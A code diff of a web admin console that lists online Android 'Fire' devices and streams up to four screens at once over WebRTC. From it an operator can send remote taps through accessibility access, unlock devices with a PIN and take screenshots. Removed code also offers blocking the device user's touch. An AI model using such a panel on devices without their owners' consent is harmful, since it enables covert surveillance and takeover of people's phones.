-        video.srcObject = event.streams[0];
-        setLiveUI(true);
-        addLog('STREAM_CONNECTED: Live video feed active.', 'text-cyan-400');
+      lobbyChannel
+        .on('presence', { event: 'sync' }, () => {
+          const state = lobbyChannel.presenceState();
+          onlineDevices = {};
+          Object.keys(state).forEach((key) => {
+            if (key === 'admin_console') return;
+            const info = state[key][0];
+            if (info && info.deviceId) {
+              onlineDevices[info.deviceId] = info;
+            }
+          });
+          renderDeviceList();
+        })
+        .on('broadcast', { event: 'device-heartbeat' }, ({ payload }) => {
+          if (payload && payload.deviceId) {
+            onlineDevices[payload.deviceId] = payload;
+            renderDeviceList();
+          }
+        })
+        .subscribe((status) => {
+          if (status === 'SUBSCRIBED') {
+            logMsg('Connected to Fire Fleet Lobby.', 'text-cyan-400');
+            lobbyChannel.send({ type: 'broadcast', event: 'who-is-online', payload: {} });
+          }
+        });
+    }
+
+    function renderDeviceList() {
+      const listEl = document.getElementById('deviceListContainer');
+      const query = document.getElementById('deviceSearch').value.toLowerCase();
+      const allIds = Object.keys(onlineDevices).filter((id) => {
+        const d = onlineDevices[id];
+        return id.toLowerCase().includes(query) || (d.model || '').toLowerCase().includes(query);
+      });
+
+      document.getElementById('onlineCountBadge').textContent = `${allIds.length} Online`;
+
+      const startIdx = currentPage * 4;
+      const endIdx = Math.min(startIdx + 4, allIds.length);
+      document.getElementById('pageIndicator').textContent =
+        allIds.length === 0 ? 'Page 1 (0)' : `Page ${currentPage + 1} (${startIdx + 1}–${endIdx} of ${allIds.length})`;
+
+      if (allIds.length === 0) {
+        listEl.innerHTML = `<div class="text-xs text-slate-500 text-center py-6">No Fire devices online yet.</div>`;
+        return;
+      }
+
+      listEl.innerHTML = allIds.map((id, idx) => {
+        const d = onlineDevices[id];
+        const isSelected = selectedDeviceId === id;
+        const inSlot = slots.findIndex(s => s && s.deviceId === id);
+        return `
+          <div onclick="assignDeviceToNextSlot('${id}')"
+            class="p-2.5 rounded-xl border ${isSelected ? 'border-cyan-500 bg-cyan-950/20' : 'border-slate-800 bg-[#050914]'} hover:border-slate-600 cursor-pointer transition">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-bold text-white truncate">#${idx + 1} ${d.model || 'Android'}</span>
+              <span class="text-[10px] px-1.5 py-0.5 rounded ${inSlot !== -1 ? 'bg-emerald-500/20 text-emerald-400' : 'bg-slate-800 text-slate-400'}">
+                ${inSlot !== -1 ? 'Slot ' + (inSlot + 1) : 'Idle'}
+              </span>
+            </div>
+            <div class="flex items-center justify-between mt-1 text-[10px] text-slate-400 font-mono">
+              <span>${id}</span>
+              <span class="${d.accessibilityEnabled ? 'text-emerald-400' : 'text-amber-400'}">
+                ${d.accessibilityEnabled ? 'Touch OK' : 'No Touch'}
+              </span>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function changePage(delta) {
+      const total = Object.keys(onlineDevices).length;
+      const maxPage = Math.max(0, Math.ceil(total / 4) - 1);
+      currentPage = Math.min(maxPage, Math.max(0, currentPage + delta));
+      renderDeviceList();
+      connectCurrentPage4();
+    }
+
+    function connectCurrentPage4() {
+      const allIds = Object.keys(onlineDevices);
+      const pageIds = allIds.slice(currentPage * 4, currentPage * 4 + 4);
+      disconnectAllSlots();
+      pageIds.forEach((devId, slotIdx) => {
+        connectDeviceToSlot(devId, slotIdx);
+      });
+      if (pageIds.length > 0) {
+        setActiveTarget(pageIds[0]);
+      }
+    }
+
+    function assignDeviceToNextSlot(deviceId) {
+      setActiveTarget(deviceId);
+      const existingSlot = slots.findIndex(s => s && s.deviceId === deviceId);
+      if (existingSlot !== -1) {
+        selectSlot(existingSlot);
+        return;
+      }
+      const emptySlot = slots.findIndex(s => s === null);
+      const targetSlot = emptySlot !== -1 ? emptySlot : 0;
+      connectDeviceToSlot(deviceId, targetSlot);
+      selectSlot(targetSlot);
+    }
+
+    function selectSlot(slotIndex) {
+      for (let i = 0; i < 4; i++) {
+        document.getElementById(`slotCard-${i}`).classList.remove('selected-slot');
+      }
+      document.getElementById(`slotCard-${slotIndex}`).classList.add('selected-slot');
+      if (slots[slotIndex]) {
+        setActiveTarget(slots[slotIndex].deviceId);
+      }
+    }
+
+    function setActiveTarget(deviceId) {
+      selectedDeviceId = deviceId;
+      const info = onlineDevices[deviceId] || {};
+      document.getElementById('activeTargetTitle').textContent = info.model || deviceId;
+      document.getElementById('activeTargetId').textContent = `ID: ${deviceId}`;
+      const badge = document.getElementById('targetAccessBadge');
+      if (info.accessibilityEnabled) {
+        badge.textContent = 'Remote Touch Active';
+        badge.className = 'text-[10px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-400 font-bold';
+      } else {
+        badge.textContent = 'Accessibility Off';
+        badge.className = 'text-[10px] px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 font-bold';
+      }
+      renderDeviceList();
+    }
+
+    async function connectDeviceToSlot(deviceId, slotIndex) {
+      await disconnectSlot(slotIndex);
+
+      const info = onlineDevices[deviceId] || {};
+      document.getElementById(`slotTitle-${slotIndex}`).textContent = `Slot ${slotIndex + 1}: ${info.model || deviceId}`;
+      document.getElementById(`slotSub-${slotIndex}`).textContent = `ID: ${deviceId}`;
+      document.getElementById(`slotDot-${slotIndex}`).className = 'w-2.5 h-2.5 rounded-full bg-amber-400 animate-pulse';
+
+      const pc = new RTCPeerConnection(rtcConfig);
+      const devChannel = supabaseClient.channel(`fire-device-${deviceId}`);
+
+      pc.ontrack = (event) => {
+        const vid = document.getElementById(`slotVideo-${slotIndex}`);
+        vid.srcObject = event.streams[0];
+        document.getElementById(`slotPlaceholder-${slotIndex}`).classList.add('hidden');
+        document.getElementById(`slotDot-${slotIndex}`).className = 'w-2.5 h-2.5 rounded-full bg-emerald-400';
+        logMsg(`Slot ${slotIndex + 1} LIVE: ${deviceId}`, 'text-cyan-400');
       };
 
-      peerConnection.onicecandidate = (event) => {
-        if (event.candidate && channel) {
-          channel.send({
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          devChannel.send({
             type: 'broadcast',
             event: 'ice-viewer',
             payload: { candidate: event.candidate.toJSON() }
           });
         }
       };
-    }
 
-    async function setupChannel(autoStart = false) {
-      const url = document.getElementById('sbUrl').value.trim() || DEFAULT_SUPABASE_URL;
-      const key = document.getElementById('sbKey').value.trim() || DEFAULT_SUPABASE_KEY;
-      const room = document.getElementById('roomId').value.trim() || DEFAULT_ROOM_ID;
-
-      localStorage.setItem('admin_screen_cfg', JSON.stringify({ url, key, room }));
-
-      supabaseClient = supabase.createClient(url, key);
-      if (channel) await supabaseClient.removeChannel(channel);
-
-      initPeerConnection();
-      channel = supabaseClient.channel(`screen-room-${room}`);
-
-      channel
+      devChannel
         .on('broadcast', { event: 'offer' }, async ({ payload }) => {
-          addLog('OFFER_RECEIVED: Establishing WebRTC stream...', 'text-cyan-400');
-          initPeerConnection();
-          await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: payload.sdp }));
-          const answer = await peerConnection.createAnswer();
-          await peerConnection.setLocalDescription(answer);
-
-          channel.send({
+          await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: payload.sdp }));
+          const answer = await pc.createAnswer();
+          await pc.setLocalDescription(answer);
+          devChannel.send({
             type: 'broadcast',
             event: 'answer',
             payload: { sdp: answer.sdp }
           });
         })
         .on('broadcast', { event: 'ice-android' }, async ({ payload }) => {
-          if (payload && peerConnection) {
-            await peerConnection.addIceCandidate(new RTCIceCandidate({
+          if (payload) {
+            await pc.addIceCandidate(new RTCIceCandidate({
               sdpMid: payload.sdpMid,
               sdpMLineIndex: payload.sdpMLineIndex,
               candidate: payload.candidate
             }));
           }
         })
-        .on('broadcast', { event: 'device-telemetry' }, ({ payload }) => {
-          const onlineTag = document.getElementById('deviceOnlineTag');
-          if (payload.needsReverify) {
-            onlineTag.textContent = 'Fire Status: Needs Re-verify (Rebooted)';
-            onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300';
-          } else {
-            onlineTag.textContent = 'Fire Status: Online (24/7 Admin Lock)';
-            onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300';
-          }
-
-          if (payload.model) document.getElementById('statModel').textContent = payload.model;
-          if (payload.os) document.getElementById('statOs').textContent = payload.os;
-          if (payload.log) addLog(payload.log, 'text-emerald-400');
-        })
         .subscribe((status) => {
           if (status === 'SUBSCRIBED') {
-            document.getElementById('connBadge').textContent = 'Channel Ready (Standby)';
-            addLog(`CHANNEL_SUBSCRIBED: Listening on "${room}"`, 'text-emerald-300');
-            sendAdminCommand('PING_DEVICE');
-            if (autoStart) {
-              sendAdminCommand('ADMIN_START_STREAM');
-            }
+            devChannel.send({
+              type: 'broadcast',
+              event: 'admin-command',
+              payload: { command: 'ADMIN_START_STREAM' }
+            });
           }
         });
+
+      slots[slotIndex] = { deviceId, channel: devChannel, pc };
+      renderDeviceList();
     }
 
-    async function adminConnectDevice() {
-      if (!channel) {
-        await setupChannel(true);
+    function reconnectSlot(slotIndex) {
+      if (slots[slotIndex]) {
+        connectDeviceToSlot(slots[slotIndex].deviceId, slotIndex);
+      }
+    }
+
+    async function disconnectSlot(slotIndex) {
+      const s = slots[slotIndex];
+      if (!s) return;
+      try {
+        s.channel.send({
+          type: 'broadcast',
+          event: 'admin-command',
+          payload: { command: 'ADMIN_STOP_STREAM' }
+        });
+        await supabaseClient.removeChannel(s.channel);
+        s.pc.close();
+      } catch (_) {}
+
+      slots[slotIndex] = null;
+      const vid = document.getElementById(`slotVideo-${slotIndex}`);
+      vid.srcObject = null;
+      document.getElementById(`slotPlaceholder-${slotIndex}`).classList.remove('hidden');
+      document.getElementById(`slotTitle-${slotIndex}`).textContent = `Slot ${slotIndex + 1}: Empty`;
+      document.getElementById(`slotSub-${slotIndex}`).textContent = `ID: ---`;
+      document.getElementById(`slotDot-${slotIndex}`).className = 'w-2.5 h-2.5 rounded-full bg-slate-600';
+      renderDeviceList();
+    }
+
+    function disconnectAllSlots() {
+      for (let i = 0; i < 4; i++) disconnectSlot(i);
+    }
+
+    // Remote Touch & Lock Screen Control Functions
+    function toggleRemoteTouch() {
+      remoteTouchActive = !remoteTouchActive;
+      const btn = document.getElementById('btnTouchToggle');
+      btn.textContent = remoteTouchActive ? 'ON (Click Video)' : 'OFF';
+      btn.className = remoteTouchActive
+        ? 'px-3 py-1 rounded-full text-xs font-bold bg-emerald-600 text-white'
+        : 'px-3 py-1 rounded-full text-xs font-bold bg-slate-700 text-slate-300';
+    }
+
+    function handleGridVideoClick(event, slotIndex) {
+      selectSlot(slotIndex);
+      if (!remoteTouchActive || !slots[slotIndex]) return;
+
+      const video = event.target;
+      const rect = video.getBoundingClientRect();
+
+      // Calculate exact normalized coordinates inside the actual rendered video frame (accounting for object-contain letterboxing)
+      const videoRatio = (video.videoWidth || 720) / (video.videoHeight || 1280);
+      const boxRatio = rect.width / rect.height;
+
+      let renderWidth = rect.width;
+      let renderHeight = rect.height;
+      let offsetX = 0;
+      let offsetY = 0;
+
+      if (videoRatio > boxRatio) {
+        renderHeight = rect.width / videoRatio;
+        offsetY = (rect.height - renderHeight) / 2;
       } else {
-        sendAdminCommand('ADMIN_START_STREAM');
+        renderWidth = rect.height * videoRatio;
+        offsetX = (rect.width - renderWidth) / 2;
       }
-      addLog('CMD_SENT: ADMIN_START_STREAM dispatched.', 'text-emerald-300');
+
+      const clickX = event.clientX - rect.left - offsetX;
+      const clickY = event.clientY - rect.top - offsetY;
+
+      if (clickX < 0 || clickY < 0 || clickX > renderWidth || clickY > renderHeight) return;
+
+      const normX = (clickX / renderWidth).toFixed(4);
+      const normY = (clickY / renderHeight).toFixed(4);
+
+      sendControl('REMOTE_TAP', { x: parseFloat(normX), y: parseFloat(normY) });
     }
 
-    function adminDisconnectDevice() {
-      sendAdminCommand('ADMIN_STOP_STREAM');
-      if (peerConnection) {
-        peerConnection.close();
-        peerConnection = null;
-      }
-      const video = document.getElementById('remoteVideo');
-      video.srcObject = null;
-      setLiveUI(false);
-      addLog('ADMIN_DISCONNECT: Stream paused by Admin.', 'text-red-400');
-    }
-
-    function sendAdminCommand(cmd, extraData = {}) {
-      if (!channel) {
-        addLog('ERROR: Channel not initialized.', 'text-red-400');
+    function sendControl(command, extra = {}) {
+      if (!selectedDeviceId) {
+        alert('Please click on a phone screen first to select it.');
         return;
       }
-      channel.send({
-        type: 'broadcast',
-        event: 'admin-command',
-        payload: { command: cmd, ...extraData }
-      });
-      addLog(`CMD_DISPATCHED: ${cmd}`, 'text-amber-300');
+      const slot = slots.find(s => s && s.deviceId === selectedDeviceId);
+      if (slot && slot.channel) {
+        slot.channel.send({
+          type: 'broadcast',
+          event: 'admin-command',
+          payload: { command, ...extra }
+        });
+        logMsg(`CMD -> ${selectedDeviceId}: ${command}`, 'text-amber-300');
+      } else {
+        // Send via temporary channel if device is not currently streaming video
+        const tempCh = supabaseClient.channel(`fire-device-${selectedDeviceId}`);
+        tempCh.subscribe((status) => {
+          if (status === 'SUBSCRIBED') {
+            tempCh.send({
+              type: 'broadcast',
+              event: 'admin-command',
+              payload: { command, ...extra }
+            });
+            logMsg(`CMD -> ${selectedDeviceId}: ${command}`, 'text-amber-300');
+          }
+        });
+      }
     }
 
-    function takeScreenshot() {
-      const video = document.getElementById('remoteVideo');
-      if (!video.srcObject) return alert('No active stream to capture.');
+    function appendPin(digit) {
+      const inp = document.getElementById('pinInput');
+      inp.value += digit;
+    }
+
+    function clearPin() {
+      document.getElementById('pinInput').value = '';
+    }
+
+    function sendPinUnlock() {
+      const pin = document.getElementById('pinInput').value.trim();
+      if (!pin) return alert('Enter PIN or password first.');
+      sendControl('UNLOCK_WITH_PIN', { pin });
+      logMsg(`PIN_SENT -> ${selectedDeviceId}: ****`, 'text-emerald-400');
+    }
+
+    function takeSlotScreenshot(slotIndex) {
+      const video = document.getElementById(`slotVideo-${slotIndex}`);
+      if (!video || !video.srcObject) return alert('No active video in this slot.');
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 720;
       canvas.height = video.videoHeight || 1280;
       canvas.getContext('2d').drawImage(video, 0, 0);
       const link = document.createElement('a');
-      link.download = `fire_screen_${Date.now()}.png`;
+      link.download = `fire_${slots[slotIndex].deviceId}_${Date.now()}.png`;
       link.href = canvas.toDataURL('image/png');
       link.click();
-      addLog('SCREENSHOT_SAVED: Downloaded PNG snapshot.', 'text-blue-400');
-    }
-
-    function toggleTouchMode() {
-      simulateTouchEnabled = !simulateTouchEnabled;
-      const btn = document.getElementById('btnTouchSim');
-      btn.innerHTML = simulateTouchEnabled
-        ? '<i class="fa-solid fa-hand-pointer text-emerald-400"></i><span>Simulate Touch: ON</span>'
-        : '<i class="fa-solid fa-hand-pointer text-indigo-400"></i><span>Simulate Touch: OFF</span>';
-      addLog(`TOUCH_SIMULATION: ${simulateTouchEnabled ? 'ENABLED' : 'DISABLED'}`, 'text-indigo-300');
-    }
-
-    function handleScreenClick(event) {
-      if (!simulateTouchEnabled) return;
-      const rect = event.target.getBoundingClientRect();
-      const normX = ((event.clientX - rect.left) / rect.width).toFixed(3);
-      const normY = ((event.clientY - rect.top) / rect.height).toFixed(3);
-      sendAdminCommand('REMOTE_TAP', { x: normX, y: normY });
-      addLog(`TOUCH_EVENT (${normX}, ${normY})`, 'text-cyan-300');
-    }
-
-    function toggleBlockInput() {
-      blockUserInputEnabled = !blockUserInputEnabled;
-      const btn = document.getElementById('btnBlockInput');
-      btn.innerHTML = blockUserInputEnabled
-        ? '<i class="fa-solid fa-lock text-red-400"></i><span>Device Input: LOCKED</span>'
-        : '<i class="fa-solid fa-lock text-rose-400"></i><span>Block User Touch</span>';
-      sendAdminCommand(blockUserInputEnabled ? 'LOCK_DEVICE_TOUCH' : 'UNLOCK_DEVICE_TOUCH');
-    }
-
-    function toggleFullscreen() {
-      const video = document.getElementById('remoteVideo');
-      if (video.requestFullscreen) video.requestFullscreen();
-    }
-
-    function initCharts() {
-      const labels = ['10:00', '11:00', '12:00', '13:00', '14:00', '15:00', '16:00', '17:00', '18:00'];
-      new Chart(document.getElementById('barChart'), {
-        type: 'bar',
-        data: {
-          labels,
-          datasets: [{ data: [12, 14, 15, 13, 15, 15, 14, 15, 15], backgroundColor: '#10b981', borderRadius: 4 }]
-        },
-        options: {
-          responsive: true, maintainAspectRatio: false,
-          plugins: { legend: { display: false } },
-          scales: {
-            x: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { display: false } },
-            y: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { color: '#1e293b' } }
-          }
-        }
-      });
-
-      new Chart(document.getElementById('lineChart'), {
-        type: 'line',
-        data: {
-          labels,
-          datasets: [{
-            data: [950, 1100, 1250, 1180, 1400, 1320, 1210, 1290, 1350],
-            borderColor: '#a855f7', backgroundColor: 'rgba(168, 85, 247, 0.15)',
-            fill: true, tension: 0.4, pointRadius: 2
-          }]
-        },
-        options: {
-          responsive: true, maintainAspectRatio: false,
-          plugins: { legend: { display: false } },
-          scales: {
-            x: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { display: false } },
-            y: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { color: '#1e293b' } }
-          }
-        }
-      });
     }
 
     window.onload = () => {
-      initCharts();
-      const saved = JSON.parse(localStorage.getItem('admin_screen_cfg') || '{}');
-      document.getElementById('sbUrl').value = saved.url || DEFAULT_SUPABASE_URL;
-      document.getElementById('sbKey').value = saved.key || DEFAULT_SUPABASE_KEY;
-      document.getElementById('roomId').value = saved.room || DEFAULT_ROOM_ID;
-      setupChannel(false);
+      buildGridUI();
+      initLobby();
     };
   </script>
 </body>
